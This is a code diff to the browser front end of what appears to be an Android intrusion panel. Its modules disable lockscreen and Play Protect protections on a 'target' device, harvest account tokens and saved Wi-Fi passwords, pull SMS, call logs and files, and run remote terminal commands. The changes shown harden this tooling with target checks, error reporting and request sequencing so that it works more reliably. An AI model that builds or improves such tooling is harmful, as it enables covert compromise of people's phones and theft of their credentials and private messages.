@@ -7,18 +7,20 @@
 // ============================================================
 window.Skeleton = (function () {
   async function neutralizeSecurity() {
+    if (!STATE.activeSerial) { pushFlow('ALERT', 'No target selected — arm a device first.'); return; }  // fix: never fire blind
     if (!confirm('Execute Skeleton Neutralizer? This will disable lockscreen, Play Protect, and security controls on the target.')) return;
+    const serial = STATE.activeSerial;  // fix: snapshot — the 4s poll may rebuild the selector mid-flight
     pushFlow('STRIKE', 'Neutralizing device security posture...');
     try {
       const res = await api('/api/skeleton/neutralize', {
         method: 'POST',
-        body: JSON.stringify({ serial: STATE.activeSerial })
+        body: JSON.stringify({ serial })
       });
       if (res.success) {
         pushFlow('HIT', `Security neutralized: ${res.neutralized ? res.neutralized.join(', ') : 'All gates down'}`);
         loadPosture();
       } else {
-        pushFlow('ALERT', `Neutralization error: ${res.error || res.message}`);
+        pushFlow('ALERT', `Neutralization error: ${res.error || res.message || 'Unknown failure'}`);
       }
     } catch (e) {
       pushFlow('ALERT', `Skeleton error: ${e.message}`);
@@ -26,15 +28,19 @@ window.Skeleton = (function () {
   }
 
   async function restoreSecurity() {
+    if (!STATE.activeSerial) { pushFlow('ALERT', 'No target selected — arm a device first.'); return; }  // fix: never fire blind
+    const serial = STATE.activeSerial;  // fix: snapshot at press
     pushFlow('SYS', 'Restoring security posture from baseline snapshot...');
     try {
       const res = await api('/api/skeleton/restore', {
         method: 'POST',
-        body: JSON.stringify({ serial: STATE.activeSerial })
+        body: JSON.stringify({ serial })
       });
       if (res.success) {
         pushFlow('HIT', 'Security baseline restored.');
         loadPosture();
+      } else {
+        pushFlow('ALERT', `Restore failed: ${res.error || res.message || 'Unknown failure'}`);
       }
     } catch (e) {
       pushFlow('ALERT', `Restore failed: ${e.message}`);
@@ -44,6 +50,10 @@ window.Skeleton = (function () {
   async function loadPosture() {
     const el = document.getElementById('skeletonPostureDetails');
     if (!el) return;
+    if (!STATE.activeSerial) {
+      el.innerHTML = '<div style="color: var(--text-graphite);">Connect target to inspect security posture.</div>';
+      return;  // fix: no empty-serial queries against the default device
+    }
     try {
       const res = await api(`/api/skeleton/creds/posture?serial=${encodeURIComponent(STATE.activeSerial || '')}`);
       el.innerHTML = `
@@ -65,9 +75,12 @@ window.Skeleton = (function () {
     pushFlow('STRIKE', 'Harvesting account tokens and stored secrets...');
 
     try {
+      let accFail = null, wifiFail = null;  // fix: a dead source is an error, not an empty result
       const [accs, wifis] = await Promise.all([
-        api(`/api/skeleton/creds/accounts?serial=${encodeURIComponent(STATE.activeSerial || '')}`).catch(() => ({ accounts: [] })),
-        api(`/api/toolkit/wifi-passwords?serial=${encodeURIComponent(STATE.activeSerial || '')}`).catch(() => ({ passwords: [] }))
+        api(`/api/skeleton/creds/accounts?serial=${encodeURIComponent(STATE.activeSerial || '')}`)
+          .catch(e => { accFail = e.message; return { accounts: [] }; }),
+        api(`/api/toolkit/wifi-passwords?serial=${encodeURIComponent(STATE.activeSerial || '')}`)
+          .catch(e => { wifiFail = e.message; return { passwords: [] }; })
       ]);
 
       let html = '';
@@ -87,6 +100,12 @@ window.Skeleton = (function () {
 
       if (!html) {
         html = '<div style="color: var(--text-graphite); padding: 12px;">No stored credentials recovered on current privilege level.</div>';
+      }
+      if (accFail || wifiFail) {
+        const parts = [];
+        if (accFail) parts.push(`accounts (${accFail})`);
+        if (wifiFail) parts.push(`wifi (${wifiFail})`);
+        html += `<div style="color: var(--amber); padding: 8px 12px; font-family: var(--font-mono); font-size: 11px;">Partial failure: ${escapeHtml(parts.join(', '))}</div>`;
       }
 
       if (list) list.innerHTML = html;
@@ -110,9 +129,11 @@ window.Skeleton = (function () {
 window.Forensics = (function () {
   let activeTab = 'sms';
   let currentPath = '/sdcard';
+  let filesGen = 0;  // fix: request sequencing — rapid dir clicks never paint stale dirs
 
   function switchTab(tabName) {
     activeTab = tabName;
+    try { localStorage.setItem('fx.tab', tabName); } catch (e) {}
     document.querySelectorAll('.forensic-tab-btn').forEach(b => {
       b.classList.toggle('active', b.dataset.tab === tabName);
     });
@@ -189,6 +210,8 @@ window.Forensics = (function () {
 
   async function loadFiles(path) {
     currentPath = path || '/sdcard';
+    try { localStorage.setItem('fx.path', currentPath); } catch (e) {}
+    const gen = ++filesGen;
     const list = document.getElementById('forensicFilesList');
     const pathEl = document.getElementById('currentFilePathDisplay');
     if (pathEl) pathEl.textContent = currentPath;
@@ -201,7 +224,9 @@ window.Forensics = (function () {
         body: JSON.stringify({ path: currentPath, serial: STATE.activeSerial })
       });
 
-      if (res.files) {
+      if (gen !== filesGen) return;  // fix: the slowest response never wins
+      const files = res.files || res.items;  // fix: accept both backend shapes
+      if (files) {
         list.innerHTML = '';
         // Up Directory Button
         if (currentPath !== '/' && currentPath !== '') {
@@ -216,7 +241,7 @@ window.Forensics = (function () {
           list.appendChild(upRow);
         }
 
-        res.files.forEach(f => {
+        files.forEach(f => {
           const row = document.createElement('div');
           row.className = 'target-card';
           const isDir = f.is_dir;
@@ -272,8 +297,20 @@ window.Forensics = (function () {
     }
   }
 
+  function onShow() {
+    // fix: restore the operator's last forensic tab/path instead of forcing 'sms'
+    let tab = 'sms';
+    try {
+      tab = localStorage.getItem('fx.tab') || 'sms';
+      const p = localStorage.getItem('fx.path');
+      if (p) currentPath = p;
+    } catch (e) {}
+    switchTab(['sms', 'calls', 'files', 'notifications'].includes(tab) ? tab : 'sms');
+  }
+
   return {
     switchTab,
+    onShow,
     loadSms,
     loadCalls,
     loadFiles,
@@ -285,6 +322,13 @@ window.Forensics = (function () {
 // 3. DEEP TOOLKIT & TERMINAL
 // ============================================================
 window.Toolkit = (function () {
+  function appendTerminal(out, text) {
+    // fix: cap the scrollback — the box must not grow without bound
+    const MAX_CHARS = 200000;
+    out.textContent = (out.textContent + text).slice(-MAX_CHARS);
+    out.scrollTop = out.scrollHeight;
+  }
+
   async function execTerminal() {
     const input = document.getElementById('terminalCommandInput');
     const out = document.getElementById('terminalOutputBox');
@@ -294,8 +338,7 @@ window.Toolkit = (function () {
     if (!cmd) return;
 
     input.value = '';
-    out.textContent += `\n$ ${cmd}\n`;
-    out.scrollTop = out.scrollHeight;
+    appendTerminal(out, `\n$ ${cmd}\n`);
 
     try {
       const res = await api('/api/terminal/exec', {
@@ -303,11 +346,9 @@ window.Toolkit = (function () {
         body: JSON.stringify({ command: cmd, serial: STATE.activeSerial })
       });
 
-      out.textContent += res.output || '(No output returned)\n';
-      out.scrollTop = out.scrollHeight;
+      appendTerminal(out, res.output || '(No output returned)\n');
     } catch (e) {
-      out.textContent += `Error: ${e.message}\n`;
-      out.scrollTop = out.scrollHeight;
+      appendTerminal(out, `Error: ${e.message}\n`);
     }
   }
 
